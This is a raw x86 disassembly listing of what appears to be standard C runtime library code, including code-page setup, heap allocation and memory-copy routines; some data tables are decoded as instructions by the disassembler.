  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
